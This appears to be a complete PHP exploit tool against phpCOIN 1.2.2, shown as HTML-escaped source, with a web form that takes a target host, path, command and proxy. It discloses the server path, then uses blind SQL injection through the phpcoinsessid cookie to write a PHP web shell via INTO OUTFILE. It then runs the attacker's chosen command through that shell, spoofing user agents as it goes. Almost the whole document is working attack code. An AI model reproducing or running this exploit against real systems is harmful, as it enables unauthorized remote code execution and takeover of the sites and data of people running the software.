<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-symbol">&lt;?php
#   ---phpcoin_122_sql_xpl.php                                                 #
#                                                                              #
#     phpCOIN 1.2.2 phpcoinsessid blind SQL injection / remote code execution  #
#                              coded by rgod                                   #
#                    site: http://rgod.altervista.org                          #
#                                                                              #
#  -&gt; this works with magic_quotes_gpc off                                     #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  Sun-Tzu:&quot;When these five kinds of spy are all at work, none can discover    #
#  the secret system.  This is called &quot;divine manipulation of the threads.&quot; It #
#  is the sovereign's most precious faculty.&quot;                                  #

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 5);
ob_implicit_flush (1);

echo'&lt;html&gt;&lt;head&gt;&lt;title&gt;phpCOIN 1.2.2 blind SQL injection  /  remote cmmnds xctn
&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
&lt;style type=&quot;text/css&quot;&gt; body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;Stile6&quot;&gt;
phpCOIN 1.2.2 blind SQL injection  /  remote cmmnds xctn&lt;/p&gt;&lt;p class=&quot;Stile6&quot;&gt;a
script  by  rgod  at        &lt;a href=&quot;http://rgod.altervista.org&quot;target=&quot;_blank&quot;&gt;
http://rgod.altervista.org&lt;/a&gt;&lt;/p&gt;&lt;table width=&quot;84%&quot;&gt;&lt;tr&gt;&lt;td width=&quot;43%&quot;&gt;  &lt;form
name=&quot;form1&quot; method=&quot;post&quot;  action=&quot;'.strip_tags($SERVER[PHP_SELF]).'&quot;&gt;&lt;p&gt;&lt;input
type=&quot;text&quot;  name=&quot;host&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;* hostname (ex:www.sitename.com)
&lt;/span&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;  &lt;span class=&quot;Stile5&quot;&gt;* path (ex:
/phpcoin/ or just / ) &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;command&quot;&gt;     &lt;span
class=&quot;Stile5&quot;&gt; * specify a command  &lt;/span&gt;  &lt;/p&gt; &lt;p&gt;        &lt;input type=&quot;text&quot;
name=&quot;pathtoWWW&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;   full application path      (ex:
&quot;/www/phpcoin/&quot;, &quot;../../www/phpcoin/&quot;,&quot;c:\www\phpcoin\&quot; ), if not specified,  we
will try to disclose the path  &lt;/span&gt; &lt;/p&gt; &lt;p&gt;        &lt;input type=&quot;text&quot;
name=&quot;PREFIX&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt; Specify a table prefix  (default: phpcoin_)
&lt;/span&gt; &lt;/p&gt;&lt;p&gt; &lt;input type=&quot;text&quot; name=&quot;port&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;specify  a
port   other than  80 ( default  value )&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input  type=&quot;text&quot;
name=&quot;proxy&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;send  exploit through an  HTTP proxy (ip:port)
&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;go!&quot;&gt;&lt;/p&gt;&lt;/form&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
while ($ii &lt;= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
             for ($li=0; $li&lt;=15; $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li+$ki].&quot;&lt;/td&gt;&quot;;
			    }
            $ki=$ki+16;
            echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
            }
if (strlen($datai)==1) {echo &quot;&lt;td&gt;0&quot;.$datai.&quot;&lt;/td&gt;&quot;;} else
{echo &quot;&lt;td&gt;&quot;.$datai.&quot;&lt;/td&gt; &quot;;}
$ii++;
$ji++;
}
for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
                       }

for ($li=$ci*16; $li&lt;=strlen($headeri); $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li].&quot;&lt;/td&gt;&quot;;
			    }
echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket &lt; 0) {
                   echo &quot;socket_create() failed: reason: &quot; . socket_strerror($socket) . &quot;&lt;br&gt;&quot;;
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo &quot;OK.&lt;br&gt;&quot;;
                    echo &quot;Attempting to connect to &quot;.$host.&quot; on port &quot;.$port.&quot;...&lt;br&gt;&quot;;
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result &lt; 0) {
                                     echo &quot;socket_connect() failed.\r\nReason: (&quot;.$result.&quot;) &quot; . socket_strerror($result) . &quot;&lt;br&gt;&lt;br&gt;&quot;;
                                    }
	                       else
		                    {
                                     echo &quot;OK.&lt;br&gt;&lt;br&gt;&quot;;
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo &quot;Reading response:&lt;br&gt;&quot;;
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo &quot;Closing socket...&quot;;
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
      {$ock=fsockopen(gethostbyname($host),$port);
       if (!$ock) { echo 'No response from '.htmlentities($host);
			die; }
      }
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}

$host=$_POST[host];
$path=$_POST[path];
$port=$_POST[port];
$command=$_POST[command];
$pathtoWWW=$_POST[pathtoWWW];
$PREFIX=$_POST[PREFIX];

if (($host&lt;&gt;'') and ($path&lt;&gt;'') and ($command&lt;&gt;''))
{
$port=intval(trim($port));
if ($port=='') {$port=80;}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$host=str_replace(&quot;\r\n&quot;,&quot;&quot;,$host);
$path=str_replace(&quot;\r\n&quot;,&quot;&quot;,$path);
if ($PREFIX=='') { $PREFIX=&quot;phpcoin_&quot;;}
if ($pathtoWWW=='')
{
#STEP 0 -&gt; Disclose full application path
$packet=&quot;GET &quot;.$p.&quot;config.php HTTP/1.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;User-Agent: J-PHONE/3.0/J-SH07\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
if (eregi(&quot;Fatal error&quot;,$html))
    {
      $temp=explode(&quot;in &lt;b&gt;&quot;,$html);
      $temp2=explode(&quot;coin_includes&quot;,$temp[1]);
      $pathtoWWW=$temp2[0];
      echo &quot;Full application path -&gt;&quot;.htmlentities($pathtoWWW).&quot;&lt;br&gt;&quot;;
    }
else {echo &quot;sorry, unable to disclose path...&quot;; die;}
}

$pathtoWWW=str_replace('\\','\\\\\\\\',$pathtoWWW); //for Windows boxes...
$dirs= array
(
 '', 'coin_admin/', 'coin_auxpages/', 'coin_cron/', 'coin_database/', 'coin_docs/', 'coin_images/',
 'coin_includes/', 'coin_lang/', 'coin_modules/', 'coin_setup/', 'coin_themes/',
 'coin_lang/lang_english/','coin_modules/articles/','coin_modules/cc/',
 'coin_modules/clients/', 'coin_modules/domains/','coin_modules/downloads/',
 'coin_modules/faq/','coin_modules/helpdesk/','coin_modules/invoices/',
 'coin_modules/mail/','coin_modules/orders/','coin_modules/pages/',
 'coin_modules/search/', 'coin_modules/siteinfo/', 'coin_modules/whois/',
 'coin_setup/sql/',
 'coin_themes/cantex/','coin_themes/classic/','coin_themes/coolblue/',
 'coin_themes/earthtone/',
 'coin_themes/cantex/html/','coin_themes/cantex/images/','coin_themes/cantex/images/nav/',
 'coin_themes/classic/html/','coin_themes/classic/images/','coin_themes/classic/images/nav/',
 'coin_themes/coolblue/html/', 'coin_themes/coolblue/images/','coin_themes/coolblue/images/nav/',
 'coin_themes/earthtone/html/','coin_themes/earthtone/images/', 'coin_themes/earthtone/html/nav/'
);

for ($i=0; $i&lt;=count($dirs)-1; $i++)
{
#STEP 1 -&gt;Shell inject
//we have to be sure that phpcoin_sessions table is not empty, so firstly
//we call main index page
$packet=&quot;GET &quot;.$p.&quot;index.php HTTP/1.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;User-Agent: Gulliver/1.3\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
//max 36 chars shell
$SQL=&quot;-' UNION SELECT 'Hi!&lt;?php system(\$_GET[cmd]);?&gt;' INTO OUTFILE '&quot;.$pathtoWWW.$dirs[$i].&quot;coin_cfg.php' FROM &quot;.$PREFIX.&quot;sessions LIMIT 1/*&quot;;
$SQL=urlencode($SQL);
$packet=&quot;GET &quot;.$p.&quot;mod.php HTTP/1.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;User-Agent: Inktomi Search\r\n&quot;;
$packet.=&quot;Cookie: phpcoinsessid=&quot;.$SQL.&quot;; \r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);

#STEP 2 -&gt; Launch commands...
$packet=&quot;GET &quot;.$p.$dirs[$i].&quot;coin_cfg.php?cmd=&quot;.urlencode($command).&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;User-Agent: Industry Program 1.0.x\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);
if (eregi(&quot;Hi!&quot;,$html)) {echo &quot;Exploit succeeded...&quot;;die;}
}
}
else
{echo &quot;Fill * required, optionally specify a proxy &quot;;}

?&gt;
</span></span>
</code></pre>
